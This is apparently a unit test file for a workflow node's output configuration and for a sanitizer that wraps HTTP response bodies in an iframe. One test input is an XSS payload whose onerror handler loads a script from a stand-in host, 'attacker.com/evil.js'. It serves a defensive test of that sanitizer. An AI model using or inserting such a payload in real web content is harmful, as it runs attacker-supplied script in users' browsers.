import { configuredOutputs, sanitizeResponseData } from '../utils';

describe('configuredOutputs', () => {
	it('returns array of objects when version >= 1.3', () => {
		const result = configuredOutputs(1.3, {});
		expect(result).toEqual([
			{ type: 'main', displayName: 'Input Data' },
			{ type: 'main', displayName: 'Response' },
		]);
	});

	it('returns array of objects when version > 1.4 and enableResponseOutput', () => {
		const result = configuredOutputs(2, { enableResponseOutput: true });
		expect(result).toEqual([
			{ type: 'main', displayName: 'Input Data' },
			{ type: 'main', displayName: 'Response' },
		]);
	});

	it('returns ["main"] when version < 1.3', () => {
		const result = configuredOutputs(1.2, {});
		expect(result).toEqual(['main']);
	});

	it('returns array of objects when version  1.4 and enableResponseOutput', () => {
		const result = configuredOutputs(1.4, { enableResponseOutput: true });
		expect(result).toEqual([
			{ type: 'main', displayName: 'Input Data' },
			{ type: 'main', displayName: 'Response' },
		]);
	});

	it('returns ["main"] when version  1.4 and !enableResponseOutput', () => {
		const result = configuredOutputs(1.4, { enableResponseOutput: false });
		expect(result).toEqual(['main']);
	});
});

describe('sanitizeResponseData', () => {
	test.each([
		{
			src: 'https://example.com',
		},
		{
			src: "<source onerror=\"s=document.createElement('script');s.src='http://attacker.com/evil.js';document.body.appendChild(s);\">",
		},
	])('wraps the response body in an iframe', ({ src }) => {
		const result = sanitizeResponseData(src);

		expect(result).toContain('<iframe');
		expect(result).toContain(`src="${src}"`);
		expect(result).toContain('width: 100%');
		expect(result).toContain('height: 100%');
		expect(result).toContain('allowtransparency="true"');
		expect(result.trim().startsWith('<iframe')).toBe(true);
		expect(result.trim().endsWith('</iframe>')).toBe(true);
	});
});
